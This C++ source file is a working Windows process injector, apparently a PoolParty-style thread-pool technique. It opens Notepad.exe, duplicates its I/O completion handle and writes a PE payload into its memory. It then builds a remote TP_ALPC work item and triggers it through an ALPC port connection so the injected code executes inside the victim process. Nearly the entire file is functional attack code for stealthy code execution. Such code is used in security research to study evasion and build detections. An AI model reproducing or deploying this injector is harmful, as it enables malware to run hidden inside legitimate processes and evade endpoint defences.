#include "Misc.hpp"
#include "Native.hpp"
#include "ThreadPool.hpp"
#include "SelfPEInject.hpp"

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define ProcessHandleInformation 51
#define POOL_PARTY_FILE_NAME L"PoolParty.txt"
#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"
#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }
#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
HANDLE getProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;

}

int main() {
	SIZE_T byteWritten;
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	LPHANDLE pDuplicateHandle = new HANDLE;
	DWORD PID = 0;
	HANDLE hProc = getProcHandlebyName((LPWSTR)L"Notepad.exe", &PID);
	if (!hProc) {
		DEBUG("[x] Cannot open the process\n");
		return -1;
	}

	NTSTATUS ntStatus;
	vector<BYTE> information;
	ULONG returnLength = 0;
	do {
		information.resize(returnLength);
		ntStatus =
			NtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
		//STATUS_INFO_LENGTH_MISMATCH
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandle,
			IO_COMPLETION_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded: %p\n", GetLastError());
			//return -1;
			continue;
		}


		vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*pDuplicateHandle,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		if (wstring(pObjectInformation->TypeName.Buffer) == L"IoCompletion") {
			break;
		}
	}

	LPVOID OEP = WritePEToTarget(hProc);

	HANDLE hTempAlpc;
	NtAlpcCreatePort(&hTempAlpc, nullptr, nullptr);
	PFULL_TP_ALPC pTpAlpc = { 0 };
	ntStatus = TpAllocAlpcCompletion(&pTpAlpc, hTempAlpc, static_cast<PTP_ALPC_CALLBACK>(OEP), nullptr, nullptr);
	if (!NT_SUCCESS(ntStatus)) {
		DEBUG("[x] TpAllocAlpcCompletion: %p\n", ntStatus);
		return -1;
	}

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcObjectAttributes{ 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes{ 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;
	
	HANDLE hAlpc;
	NtAlpcCreatePort(&hAlpc, &AlpcObjectAttributes, &AlpcPortAttributes);

	const auto pRemoteTpAlpc = static_cast<PFULL_TP_ALPC>(VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	WriteProcessMemory(hProc, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC), &byteWritten);

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort{ 0 };
	AlpcPortAssociateCopmletionPort.CompletionKey = pRemoteTpAlpc;
	AlpcPortAssociateCopmletionPort.CompletionPort = *pDuplicateHandle;
	PVOID o1 = &AlpcPortAssociateCopmletionPort;
	NtAlpcSetInformation(hAlpc, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));

	OBJECT_ATTRIBUTES AlpcClientObjectAttributes{ 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	const std::string Buffer = POOL_PARTY_POEM;
	const auto BufferLength = Buffer.length();

	ALPC_MESSAGE ClientAlpcPortMessage{ 0 };
	PVOID x = &ClientAlpcPortMessage;
	PVOID y = &ClientAlpcPortMessage.PortHeader.u1.s1.DataLength;
	PVOID z = &ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength;
	PVOID g = &ClientAlpcPortMessage.PortMessage;
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);
	auto szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

	/* NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
	LARGE_INTEGER liTimeout{ 0 };
	liTimeout.QuadPart = -10000000;
	PVOID k = &liTimeout;
	HANDLE hAlpc1;
	PVOID a = &ClientAlpcPortMessage;
	PVOID b = &szClientAlpcPortMessage;
	PVOID c = &liTimeout;

	PVOID v1 = &usAlpcPortName;
	PVOID v2 = &AlpcClientObjectAttributes;
	PVOID v3 = &AlpcPortAttributes;
	PVOID v8 = &ClientAlpcPortMessage;
	PVOID v9 = &liTimeout;
	NtAlpcConnectPort(&hAlpc1 ,
		&usAlpcPortName,
		&AlpcClientObjectAttributes,
		&AlpcPortAttributes,
		0x20000,
		nullptr,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		nullptr,
		nullptr,
		&liTimeout);
}